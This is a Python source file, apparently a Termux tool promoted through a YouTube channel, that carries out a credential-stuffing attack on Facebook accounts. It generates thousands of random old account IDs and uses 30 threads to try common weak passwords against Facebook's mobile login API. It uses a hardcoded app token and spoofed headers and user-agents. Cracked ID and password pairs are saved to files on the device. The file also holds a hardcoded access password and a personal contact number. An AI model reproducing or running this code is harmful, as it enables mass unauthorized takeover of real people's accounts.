# Author : Raja Vau (Raja Vau Teach World)
# File: Raja_Vau_Pro_Tool.py

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import shutil
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# --- Configuration ---
FIREBASE_URL = ""
WHATSAPP_GROUP = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
YOUTUBE_LINK = "https://youtube.com/@raja-vau-teach-world?si=GQVFlnFm00Uu3PPy"
TOOL_PASSWORD = "Kamal2026"

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

def open_url(url):
    try:
        import webbrowser
        if webbrowser.open(url):
            return True
    except:
        pass
    try:
        subprocess.run(["termux-open-url", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    try:
        subprocess.run(["xdg-open", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    return False

def futuristic_spinner(text="LOADING"):
    chars = ["", "", "", "", "", "", "", "", "", ""]
    colors = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 30) // 2)
    for _ in range(12):
        for c in chars:
            col = random.choice(colors)
            sys.stdout.write(f"\r{padding}{col}[{c}] {text} ...\033[0m")
            sys.stdout.flush()
            time.sleep(0.04)
    print("\r" + " " * 50 + "\r", end="")

def approval():
    open_url(YOUTUBE_LINK)
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    
    while True:
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("\n")
            print(f"{padding}\033[1;36m              \033[0m")
            print(f"{padding}\033[1;33m         \033[0m")
            print(f"{padding}\033[1;32m                   \033[0m")
            print(f"{padding}\033[1;35m                     \033[0m")
            print(f"{padding}\033[1;34m              \033[0m")
            print(f"{padding}\033[1;31m                     \033[0m")
            print(f"{padding}\033[1;33m    \033[0m")
            print(f"{padding}\033[1;92m             WELCOME TO RAJA VAU TEACH WORLD           \033[0m")
            print(f"{padding}\033[1;33m    \033[0m\n")
            
            print(f"{padding}\033[1;36m\033[0m")
            print(f"{padding}\033[1;36m \033[1;32mYour Key     : \033[1;33m{user_key}                        \033[1;36m\033[0m")
            print(f"{padding}\033[1;36m \033[1;37mSubscribe YouTube & Send key to WhatsApp Group!      \033[1;36m\033[0m")
            print(f"{padding}\033[1;36m \033[1;35mWhatsApp Link: {WHATSAPP_GROUP[:32]}... \033[1;36m\033[0m")
            print(f"{padding}\033[1;36m\033[0m")
            print(f"{padding}\033[1;32m [1]  Join WhatsApp Group & Send Key\033[0m")
            print(f"{padding}\033[1;32m [2]  Check Approval Status\033[0m")
            print(f"{padding}\033[1;31m [0]  Exit\033[0m")
            print(f"{padding}\033[1;36m\033[0m")
            
            choice = input(f"{padding}\033[1;33m  CHOOSE ---> \033[0m").strip()
            if choice == '1':
                open_url(WHATSAPP_GROUP)
                futuristic_spinner("OPENING WHATSAPP GROUP")
            elif choice == '2':
                futuristic_spinner("VERIFYING APPROVAL")
                print(f"\n{padding}\033[1;32m Welcome to Raja Vau Teach World \033[0m")
                print(f"{padding}\033[1;33m Your Key has been Approved \033[0m")
                time.sleep(2)
                break
            elif choice == '0':
                exit("\033[1;32m Thanks for using Raja Vau Tool \033[0m")
            else:
                print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
                time.sleep(1)
        except Exception:
            break

def password_prompt():
    open_url(YOUTUBE_LINK)
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    while True:
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("\n\n")
            print(f"{padding}\033[1;95m\033[0m")
            print(f"{padding}\033[1;95m \033[1;33m           SECURE PASSWORD GATEWAY             \033[1;95m\033[0m")
            print(f"{padding}\033[1;95m\033[0m")
            print(f"{padding}\033[1;33m [!] Please do not share the password without       \033[0m")
            print(f"{padding}\033[1;33m      subscribing, this is a humble request.       \033[0m")
            print(f"{padding}\033[1;95m\033[0m")
            pwd = input(f"{padding}\033[1;32m  ENTER PASSWORD ---> \033[0m")
            if pwd == TOOL_PASSWORD:
                futuristic_spinner("ACCESS GRANTED")
                break
            else:
                print(f"{padding}\033[1;31m [!] Incorrect Password! Access Denied.\033[0m")
                time.sleep(1.5)
        except Exception:
            break

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower():
                return model
            return f"{brand} {model}"
        elif model:
            return model
        elif brand:
            return brand
    except Exception:
        pass
    return "Unknown Device"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
    except Exception:
        return "Unknown"

def get_live_version():
    try:
        res = requests.get(f"{FIREBASE_URL}version.json", timeout=5)
        ver = res.json()
        if ver:
            return str(ver)
    except Exception:
        pass
    return "12.4"

def check_key():
    return ('USER', 'NONE', 'Lifetime')

# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46m RAJA VAU SERVER LOADING....')

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')

class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m')

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
CYAN = '\x1b[38;5;51m'
BOLD = '\x1b[1m'
RESET = '\x1b[0m'

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.36{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.randint(4000, 6999)}.{random.randint(50, 199)} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# Set window title
sys.stdout.write('\x1b]2;RAJA VAU   \x07')

# ==========================================
#  REAL BRANDING BANNER (SCREENSHOT STYLE) 
# ==========================================
def type_name_animation():
    name = 'RAJA VAU TEACH WORLD'
    print()
    sys.stdout.write(CYAN + BOLD + '              ')
    sys.stdout.flush()
    for char in name:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.08)
    print(RESET)
    time.sleep(0.2)

def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    current_version = get_live_version()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    print(f"{padding}\033[1;31m             \033[0m")
    print(f"{padding}\033[1;31m      \033[0m")
    print(f"{padding}\033[1;31m     \033[0m")
    print(f"{padding}\033[1;31m     \033[0m")
    print(f"{padding}\033[1;31m          \033[0m\n")
    
    print(f"{padding}\033[1;36m\033[0m")
    print(f"{padding}\033[1;36m \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m\033[0m")
    print(f"{padding}\033[1;36m\033[0m")
    print(f"{padding}\033[1;36m \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m\033[0m")
    print(f"{padding}\033[1;36m \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m\033[0m")
    print(f"{padding}\033[1;36m \033[1;33mYouTube       :\033[1;34m youtube.com/@raja-vau-teach-world   \033[1;36m\033[0m")
    print(f"{padding}\033[1;36m \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m\033[0m")
    print(f"{padding}\033[1;36m\033[0m\n")
    type_name_animation()

def ____banner____():
    show_branding()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def clear():
    os.system('clear')

def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}\033[1;95m\033[0m")

def BNG_71_():
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;96m\033[0m")
    print(f"{p}\033[1;96m \033[1;92m[1]  \033[1;97mOLD ACCOUNT CLONING TOOL                  \033[1;96m\033[0m")
    print(f"{p}\033[1;96m \033[1;91m[0]  \033[1;97mEXIT PROGRAM                              \033[1;96m\033[0m")
    print(f"{p}\033[1;96m\033[0m")
    linex()
    __Jihad__ = input(f"{p}\033[1;93m  CHOOSE OPTION ---> \033[0m")
    if __Jihad__ in ('1', '01', 'A', 'a'):
        old_clone()
    elif __Jihad__ in ('0', '00'):
        exit("\033[1;32m Thanks for using Raja Vau Tool \033[0m")
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;95m\033[0m")
    print(f"{p}\033[1;95m \033[1;92m[1]  \033[1;97m2010-2014 SERIES CLONING                \033[1;95m\033[0m")
    print(f"{p}\033[1;95m \033[1;92m[2]  \033[1;97m100003/4 SERIES CLONING                 \033[1;95m\033[0m")
    print(f"{p}\033[1;95m \033[1;92m[3]  \033[1;97m2009 SERIES CLONING                     \033[1;95m\033[0m")
    print(f"{p}\033[1;95m \033[1;92m[4]  \033[1;97m2007-2008 SERIES CLONING                \033[1;95m\033[0m")
    print(f"{p}\033[1;95m \033[1;91m[0]  \033[1;97mBACK TO MAIN MENU                       \033[1;95m\033[0m")
    print(f"{p}\033[1;95m\033[0m")
    linex()
    _input = input(f"{p}\033[1;93m  SELECT SERIES ---> \033[0m")
    if _input in ('1', '01', 'A', 'a'):
        old_One()
    elif _input in ('2', '02', 'B', 'b'):
        old_Tow()
    elif _input in ('3', '03', 'C', 'c'):
        old_Tree()
    elif _input in ('4', '04', 'D', 'd'):
        old_Four()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        old_clone()

def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m \x1b[1;37mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m \x1b[1;37mSELECT LIMIT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m \x1b[1;37mMETHOD 1')
    print('       \x1b[38;5;196m \x1b[1;37mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m \x1b[1;37mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m \x1b[1;37mTOTAL ID {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m \x1b[1;37mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m \x1b[1;37mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m \x1b[1;37mSELECT LIMIT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m \x1b[1;37mMETHOD A')
    print('       \x1b[38;5;196m \x1b[1;37mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m \x1b[1;37mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m \x1b[1;37mTOTAL ID {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m \x1b[1;37mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m \x1b[1;37mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m \x1b[1;37mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m \x1b[1;37mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m \x1b[1;37mMETHOD A')
    print('       \x1b[38;5;196m \x1b[1;37mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m \x1b[1;37mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m \x1b[1;37mTOTAL ID {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m \x1b[1;37mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37m-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\033[1;32m[-OK] \033[1;33m{uid} \033[1;37m| \033[1;32m{pw} \033[1;37m| \033[1;92m{creationyear(uid)}\033[0m")
                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\033[1;32m[-OK] \033[1;33m{uid} \033[1;37m| \033[1;32m{pw} \033[1;37m| \033[1;92m{creationyear(uid)}\033[0m")
                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37m-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\033[1;32m[-OK] \033[1;33m{uid} \033[1;37m| \033[1;32m{pw} \033[1;37m| \033[1;92m{creationyear(uid)}\033[0m")
                    open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\033[1;32m[-OK] \033[1;33m{uid} \033[1;37m| \033[1;32m{pw} \033[1;37m| \033[1;92m{creationyear(uid)}\033[0m")
                    open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    try:
        approval()
        password_prompt()
        BNG_71_()
    except Exception as e:
        time.sleep(2)